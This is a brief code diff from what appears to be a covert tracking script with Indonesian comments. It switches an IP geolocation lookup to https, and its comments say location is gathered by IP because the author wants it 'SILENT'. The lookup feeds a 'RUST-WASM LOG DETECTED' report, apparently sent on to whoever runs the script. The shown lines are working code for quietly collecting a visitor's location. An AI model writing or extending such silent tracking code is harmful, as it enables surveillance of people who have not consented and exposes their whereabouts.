@@ -57,7 +57,7 @@
 
                 // 3. Ambil Lokasi (Tetap IP karena kita mau SILENT)
                 // Pake IP-API yang lebih detail
-                const res = await fetch('http://ip-api.com/json/?fields=66846719');
+                const res = await fetch('https://ip-api.com/json/?fields=66846719');
                 const d = await res.json();
 
                 const report = `🦀 *RUST-WASM LOG DETECTED* 🦀\n\n` +
